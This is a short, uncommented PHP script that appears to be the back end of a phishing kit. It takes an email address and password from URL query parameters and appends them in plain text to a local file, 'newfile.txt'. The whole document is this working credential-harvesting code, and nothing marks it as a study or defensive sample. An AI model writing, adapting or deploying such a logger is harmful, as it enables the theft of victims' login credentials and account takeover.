<?php
$email = $_GET['email'];
$pass = $_GET['pass'];
$myfile = fopen("newfile.txt", "a") or die("Unable to open file!");
$txt = "EMAIL: {$email} PASS: {$pass} \n";
fwrite($myfile, $txt);
fclose($myfile);